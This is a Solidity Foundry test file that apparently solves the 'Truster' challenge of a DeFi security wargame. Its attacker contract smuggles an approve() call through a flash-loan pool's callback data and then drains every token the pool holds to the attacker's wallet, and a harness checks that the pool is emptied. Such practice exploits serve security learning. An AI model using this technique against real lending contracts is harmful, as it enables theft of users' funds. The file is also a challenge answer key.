// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";
import {console2} from "forge-std/console2.sol";

contract LenderPoolAttacker {
    TrusterLenderPool public target;
    IERC20 public token;
    address public attackerWallet;

    constructor(address _target) {
        target = TrusterLenderPool(_target);
        token = target.damnValuableToken();
        attackerWallet = msg.sender;
    }

    // Step 1 fail the transfer
    // Step 2 target is DVT Contract
    // Step 3 function call to approve Attacker Contract as the Lender Pool's Spender
    // Step 4 After Flash Loan Scope, do transferFrom Pool to Attacker Contract
    // Step 5 Transfer from Attacker Contract to Wallet

    function attack() public {
        address borrower = address(this);
        uint256 borrowAmount = 0;
        address tokenContract = address(token);
        uint256 amount = token.balanceOf((address(target)));

        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
        target.flashLoan(borrowAmount, borrower, tokenContract, data);
        //end of flash loan scope
        token.transferFrom(address(target), address(this), amount);
        uint256 myBalance = token.balanceOf(address(this));
        token.transfer(attackerWallet, myBalance);
    }
}

contract Truster is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    Utilities internal utils;
    TrusterLenderPool internal trusterLenderPool;
    DamnValuableToken internal dvt;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        trusterLenderPool = new TrusterLenderPool(address(dvt));
        vm.label(address(trusterLenderPool), "Truster Lender Pool");

        dvt.transfer(address(trusterLenderPool), TOKENS_IN_POOL);

        assertEq(dvt.balanceOf(address(trusterLenderPool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        console2.log("attacker address:", attacker);
        console2.log("address of lenderpool:", address(trusterLenderPool));
        LenderPoolAttacker attackerContract = new LenderPoolAttacker(address(trusterLenderPool));
        console2.log("address of attacker Contract:", address(attackerContract));
        attackerContract.attack();
        vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
        assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
    }
}
